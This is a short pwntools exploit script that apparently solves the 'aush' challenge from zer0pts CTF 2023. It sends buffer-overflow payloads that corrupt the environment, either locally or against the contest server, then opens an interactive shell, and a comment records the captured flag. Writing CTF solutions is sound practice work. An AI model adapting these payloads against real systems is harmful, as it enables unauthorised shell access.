#!/usr/bin/env python3
from pwn import *
from sys import argv
binary = ELF('aush',checksec=False)
#libc = ELF()
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('pwn.2023.zer0pts.com', 9006)
else:
  p = binary.process(env={})
s = lambda x, r="" : \
  p.sendafter(r, x) if r else p.send(x)
sl = lambda x, r="" : \
  p.sendlineafter(r, x) if r else p.sendline(x)

# zer0pts{p0lLut3_7h3_3nv1r0nnnNNnnnNnnnnNNNnnNnnNn}
p.sendline(b'A'*0x1a0)
p.sendline(b'A'*0x80+b'\0'*0x140)
p.interactive()

